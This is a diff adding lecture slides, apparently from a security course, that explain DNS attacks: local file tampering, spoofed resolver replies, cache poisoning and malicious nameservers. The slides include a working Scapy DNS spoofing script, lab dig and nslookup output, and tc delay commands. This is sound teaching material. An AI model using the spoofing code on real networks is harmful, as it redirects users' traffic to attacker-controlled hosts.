@@ -774,7 +774,214 @@ $
 </textarea></section>
     
 <section data-markdown data-separator="^\n\n\n"><textarea data-template>
-## ...
+## DNS Attack Surfaces
+![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)
+On the local machine (1), between the resolver and the local machine (2), between the resolver and the Internet (3), and a malicious DNS server (4)
+
+
+
+<!-- .slide: class="right-float-img-600" -->
+## 1: DNS Local Machine Attacks
+[![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)
+- If you have root on a machine, you can do a lot of damage
+- But if you really want to attack DNS...
+  - Edit /etc/hosts to hard-code an address
+  - Edit /etc/resolv.conf to change to a malicious DNS server
+
+
+
+<!-- .slide: class="right-float-img-600" -->
+<h2 class="r-fit-text">2: DNS Attacks Between Resolver</h2>
+
+[![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)
+- When the local machine sends out a query to the DNS server
+- Immediately send a spoofed reply
+  - The real reply will come in later, and then be ignored
+- This requires no special privileges other than the ability to send a network packet
+  - Although you have to be on one of the machines b/c of switches
+
+
+
+<h2 class="r-fit-text">2: DNS Attacks Between Resolver</h2>
+
+[![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image33.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image33.png)
+- When a DNS query is launched from the user's machine to the DNS server, immediately send a spoofed reply
+- This is the right-most "attacker" icon in the diagram
+
+
+
+<!-- .slide: class="small-pre" -->
+## DNS Spoof Attack
+```python
+#!/usr/bin/env python3
+from scapy.all import *
+
+def spoof_dns(pkt):
+  if(DNS in pkt and 'www.example.com' in 
+                    pkt[DNS].qd.qname.decode('utf-8')):
+     IPpkt  = IP(dst=pkt[IP].src,  src=pkt[IP].dst)
+     UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
+
+     Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
+                    rdata='1.2.3.4', ttl=259200)
+     NSsec  = DNSRR(rrname="example.com", type='NS',
+                    rdata='ns.attacker32.com', ttl=259200)
+     DNSpkt = DNS(id=pkt[DNS].id, aa=1, rd=0,
+                  qdcount=1, qr=1, ancount=1, nscount=1,
+                  qd=pkt[DNS].qd, an=Anssec, ns=NSsec)
+
+     spoofpkt = IPpkt/UDPpkt/DNSpkt
+     send(spoofpkt)
+
+f = 'udp and (src host 10.9.0.53 and dst port 53)'
+pkt=sniff(iface='eth0', filter=f, prn=spoof_dns)
+```
+
+
+
+<h2 class="r-fit-text">DNS Spoof Attack `nslookup` Output</h2>
+
+```text
+root@outer1:/# nslookup example.com
+Server:   192.168.100.1
+Address:  192.168.100.1#53
+
+Non-authoritative answer:
+Name: example.com
+Address: 192.168.100.103
+** server can't find example.com: SERVFAIL
+
+root@outer1:/# 
+```
+
+
+
+<!-- .slide: class="small-pre" -->
+## DNS Spoof Attack `dig` Output
+```text
+root@outer1:/# dig example.com
+
+; <<>> DiG 9.18.18-0ubuntu0.22.04.1-Ubuntu <<>> example.com
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 41173
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 1232
+; COOKIE: 10ea56a59bc6c7380100000065fa3c02a6160747ce093f96 (good)
+;; QUESTION SECTION:
+;example.com.     IN  A
+
+;; ANSWER SECTION:
+example.com.    259140  IN  A 192.168.100.103
+
+;; Query time: 1 msec
+;; SERVER: 192.168.100.1#53(192.168.100.1) (UDP)
+;; WHEN: Tue Mar 19 21:29:38 EDT 2024
+;; MSG SIZE  rcvd: 84
+
+root@outer1:/# 
+```
+
+
+
+## DNS Timing Issues
+- Scapy is slow, networks are fast
+- On the Docker containers, sometimes the DNS reply comes in before Scapy can send the spoof
+- Solution: cause the Internet link to be slow via the `tc` command
+  - This is done on *firewall*
+```
+// add a delay to the eth0 interface
+tc qdisc add dev eth0 root netem delay 500ms
+
+// see the delay on the eth0 interface
+tc qdisc show dev eth0
+
+// remove the delay on the eth0 interface
+tc qdisc del dev eth0 root netem
+```
+
+
+
+<h2 class="r-fit-text">Targeting the Authority Section</h2>
+
+- A DNS spoof attack would also target the *authority* section
+  - The authoritative nameserver for the domain
+- So if example.com were spoofed, a fake sub-domain (ns.example.com) would be registered as the authority
+  - Along with an IP address of a malicious nameserver
+- Then any query to *.example.com will use that (malicious) nameserver
+
+
+
+<!-- .slide: class="right-float-img-600" -->
+## 3: DNS Cache Poisoning Attack
+[![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)
+- When the DNS server doesn't know a mapping, it queries other DNS servers
+  - Starting with the root nameservers
+- Send a spoofed reply before the real reply comes in
+- This reply will stay in the DNS server's cache
+  - Poisoning it
+
+
+
+<h2 class="r-fit-text">3: DNS Cache Poisoning Attack</h2>
+
+[![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image33.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image33.png)
+- When a DNS query is launched from the user's machine to the DNS server, immediately send a spoofed reply
+- This is the left-most "attacker" icon in the diagram
+
+
+
+<h2 class="r-fit-text">3: DNS Cache Poisoning Attack</h2>
+
+[![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image33.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image33.png)
+- If it's local, it's much like the previous example
+  - Remote is harder, but possible
+- This is the right-most "attacker" icon in the diagram
+
+
+
+<!-- .slide: class="right-float-img-600" -->
+## DNS Attack Differences
+[![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)
+- 2: DNS Attacks Between Resolver
+  - This attack must occur *each* time a machine queries that address
+    - And some machines may not have much of a DNS cache
+- 3: DNS Cache Poisoning Attack
+  - This attack has the data staying in the DNS cache
+    - So only has to occur once (for a 24 hour period)
+
+
+
+<!-- .slide: class="right-float-img-600" -->
+## Local versus Remote
+![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image34.png)
+- This attack is primarily local (for now)
+- DNS packets have two values that have to be correct: transaction ID and the port number
+  - Both are 16 bit values
+- A local attack can see these values in the DNS request
+- A remote attack cannot, and has thus a $2^{32}$ chance of success
+  - But there is a version that will work; we'll see it next
+
+
+
+## End of prepared slides
+
+
+
+<!-- .slide: class="right-float-img-600" -->
+## 4: Malicious DNS Servers
+[![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)
+- If one can enter a malicious DNS server somewhere
+  - Perhaps in /etc/resolv.conf
+  - Or as the authoritative nameserver for a domain in a spoofed reply
+- Then the malicious nameserver can serve lots of bad information
+
+
+
+[![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image40.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image40.png)
+
 </textarea></section>
 
 </section>
